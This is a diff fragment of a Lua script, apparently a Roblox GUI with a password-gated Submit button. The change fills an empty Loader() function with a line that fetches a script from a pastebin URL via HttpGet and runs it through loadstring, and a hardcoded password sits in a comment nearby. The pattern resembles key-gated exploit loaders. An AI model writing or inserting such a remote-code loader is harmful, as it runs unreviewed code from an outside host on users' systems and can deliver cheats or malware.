@@ -159,7 +159,7 @@ local function SOWSWGN_fake_script() -- Submit.LocalScript
 	--password 5Y44Fhsm6u7YLscc
 	
 	function Loader()
-		
+		loadstring(game:HttpGet('https://pastebin.com/yqN9BNTt'))()
 	end
 	
 	script.Parent.Parent.Submit.MouseButton1Click:Connect(function()
